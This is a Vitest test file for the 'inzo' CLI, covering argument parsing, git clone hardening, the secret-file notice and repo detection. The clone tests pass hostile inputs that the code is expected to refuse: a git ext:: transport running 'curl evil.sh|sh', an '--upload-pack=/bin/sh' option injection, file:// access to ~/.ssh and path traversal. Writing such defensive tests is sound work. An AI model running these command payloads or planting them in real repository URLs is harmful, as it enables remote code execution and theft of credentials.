import { execFileSync } from "node:child_process";
import { mkdirSync, mkdtempSync, realpathSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { InvalidSessionDescriptorError, validateRepoName } from "inzo-protocol";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { cloneArgv, isGitRepo, isRepoRoot, secretShapedFiles } from "../git.js";
import {
  classifyStartArg,
  expandRepoShorthand,
  isUsageError,
  mcpConfigBlock,
  newSessionBranch,
  parseJoinFlags,
  parseStartFlags,
  repoNameFromUrl,
  scratchDirName,
} from "../start.js";

let dir: string;

beforeEach(() => {
  dir = realpathSync(mkdtempSync(join(tmpdir(), "inzo-start-test-")));
});

afterEach(() => {
  rmSync(dir, { recursive: true, force: true });
});

describe("start argument inference", () => {
  // One assertion per row of the §2 inference table.
  it("infers from cwd when there is no argument", () => {
    expect(classifyStartArg(undefined)).toEqual({ kind: "none" });
  });

  it.each(["cowork", "plan", "build", "research"])("treats %s as a mode", (mode) => {
    expect(classifyStartArg(mode)).toEqual({ kind: "mode", mode });
  });

  it.each([
    ["owner/repo", "https://github.com/owner/repo.git"],
    ["https://github.com/o/r.git", "https://github.com/o/r.git"],
    ["git@github.com:o/r.git", "git@github.com:o/r.git"],
    ["ssh://git@host/o/r", "ssh://git@host/o/r"],
  ])("treats %s as a repo", (arg, url) => {
    expect(classifyStartArg(arg)).toEqual({ kind: "repo", url });
  });

  it("treats a bare word as a new project name", () => {
    expect(classifyStartArg("my-app")).toEqual({ kind: "name", name: "my-app" });
  });

  it("suggests a mode instead of silently creating a near-miss directory", () => {
    expect(() => classifyStartArg("cowrok")).toThrow(/Did you mean "cowork"/);
    let caught: unknown;
    try {
      classifyStartArg("cowrok");
    } catch (err) {
      caught = err;
    }
    expect(isUsageError(caught)).toBe(true);
  });

  it("refuses a repo URL the protocol does not allow", () => {
    expect(() => classifyStartArg("ext::sh -c 'id'")).toThrow();
    expect(() => expandRepoShorthand("file:///home/victim/.ssh")).toThrow(InvalidSessionDescriptorError);
  });
});

describe("flag parsing", () => {
  it("parses the documented start flags", () => {
    const flags = parseStartFlags(["--mode", "plan", "--dir", "/tmp/x", "--json", "--yes"]);
    expect(flags).toMatchObject({ mode: "plan", dir: "/tmp/x", json: true, yes: true });
  });

  it("rejects an unknown flag and a bad mode as usage errors", () => {
    for (const argv of [["--nope"], ["--mode", "sprint"], ["--format", "yaml"], ["a", "b"]]) {
      let caught: unknown;
      try {
        parseStartFlags(argv);
      } catch (err) {
        caught = err;
      }
      expect(isUsageError(caught)).toBe(true);
    }
  });

  it("requires a code for join", () => {
    expect(parseJoinFlags(["7FK2Q9", "--dir", "/tmp"])).toMatchObject({ code: "7FK2Q9", dir: "/tmp" });
    expect(() => parseJoinFlags(["a", "b"])).toThrow();
  });
});

describe("clone hardening (P1-3)", () => {
  it("builds an argv that disables ext/file transports and submodules", () => {
    const argv = cloneArgv("https://github.com/o/r.git", "r");
    expect(argv).toEqual([
      "-c",
      "protocol.ext.allow=never",
      "-c",
      "protocol.file.allow=never",
      "clone",
      "--no-recurse-submodules",
      "--",
      "https://github.com/o/r.git",
      "r",
    ]);
    // `--` sits immediately before the URL, so nothing after it is an option.
    expect(argv[argv.indexOf("--") + 1]).toBe("https://github.com/o/r.git");
  });

  it.each([
    ["ext::sh -c 'curl evil.sh|sh'"],
    ["file:///home/victim/.ssh"],
    ["git://host/repo.git"],
    ["--upload-pack=/bin/sh"],
    ["https://host/repo\n--upload-pack=x"],
    [`https://host/${"a".repeat(600)}`],
  ])("refuses %s", (url) => {
    expect(() => cloneArgv(url, "r")).toThrow(InvalidSessionDescriptorError);
  });

  it.each(["../../.ssh", "..", "a/b", "-x"])("refuses %s as a destination", (dest) => {
    expect(() => cloneArgv("https://github.com/o/r.git", dest)).toThrow(InvalidSessionDescriptorError);
  });

  it("derives a safe basename from a URL", () => {
    expect(repoNameFromUrl("https://github.com/o/my-app.git")).toBe("my-app");
    expect(repoNameFromUrl("git@github.com:o/my-app")).toBe("my-app");
  });
});

describe("secret-scope notice (P1-6)", () => {
  function gitInit(path: string): void {
    execFileSync("git", ["init", "--quiet"], { cwd: path });
  }

  it("names gitignored secret-shaped files, and nothing else", async () => {
    gitInit(dir);
    writeFileSync(join(dir, ".gitignore"), ".env*\n*.json\n");
    writeFileSync(join(dir, ".env.local"), "SECRET=hunter2\n");
    writeFileSync(join(dir, "firebase-key.json"), "{}\n");
    writeFileSync(join(dir, "README.md"), "hi\n");

    const files = await secretShapedFiles(dir);
    expect(files).toEqual([".env.local", "firebase-key.json"]);
    // Filenames only — a content leak here would defeat the notice's purpose.
    expect(files.join(" ")).not.toContain("hunter2");
  });

  it("finds nothing in a clean workspace", async () => {
    gitInit(dir);
    writeFileSync(join(dir, "index.ts"), "export {};\n");
    expect(await secretShapedFiles(dir)).toEqual([]);
  });

  it("ignores a tracked file that merely looks secret-shaped", async () => {
    gitInit(dir);
    writeFileSync(join(dir, ".env.example"), "SECRET=\n");
    expect(await secretShapedFiles(dir)).toEqual([]);
  });

  it("reports every match outside a repo, where nothing can be gitignored", async () => {
    mkdirSync(join(dir, "sub"));
    writeFileSync(join(dir, "sub", ".env"), "x\n");
    expect(await secretShapedFiles(join(dir, "sub"))).toEqual([".env"]);
  });
});

describe("agent config", () => {
  it("prints a pasteable block in both formats, with no ANSI", () => {
    const json = mcpConfigBlock("/abs/project", "json");
    expect(JSON.parse(json).mcpServers.inzo.env.INZO_WORKSPACE).toBe("/abs/project");
    expect(json).not.toMatch(/\u001b\[/);

    const toml = mcpConfigBlock("/abs/project", "toml");
    expect(toml).toContain("[mcp_servers.inzo]");
    expect(toml).toContain('INZO_WORKSPACE = "/abs/project"');
  });
});

describe("session branch", () => {
  it("is a valid, unique inzo/ branch", () => {
    const a = newSessionBranch();
    expect(a).toMatch(/^inzo\/[0-9a-f]{6}$/);
    expect(a).not.toBe(newSessionBranch());
  });
});

describe("scratch directory naming", () => {
  it("does not repeat the prefix the code already carries", () => {
    // Found by running it: `inzo-${code}` on INZO-UGEG2Z gave the joiner a
    // directory called inzo-inzo-ugeg2z.
    expect(scratchDirName("INZO-UGEG2Z")).toBe("inzo-ugeg2z");
    expect(scratchDirName("7FK2Q9")).toBe("inzo-7fk2q9");
  });

  it("stays a valid directory name the protocol would accept", () => {
    expect(() => validateRepoName(scratchDirName("INZO-UGEG2Z"))).not.toThrow();
  });
});

describe("repo root detection", () => {
  it("does not mistake a directory inside a repo for a repo of its own", async () => {
    // Found by running `inzo join` under a home directory that was itself a
    // git repo: the scratch dir was adopted by the ancestor, `git status`
    // scanned all of $HOME, and join appeared to hang. Every later git
    // command would have targeted the wrong repository.
    execFileSync("git", ["init", "--quiet"], { cwd: dir });
    mkdirSync(join(dir, "child"));

    expect(await isGitRepo(join(dir, "child"))).toBe(true);
    expect(await isRepoRoot(join(dir, "child"))).toBe(false);
    expect(await isRepoRoot(dir)).toBe(true);
  });

  it("reports a plain directory as neither", async () => {
    const plain = join(dir, "plain");
    mkdirSync(plain);
    expect(await isRepoRoot(plain)).toBe(false);
  });
});
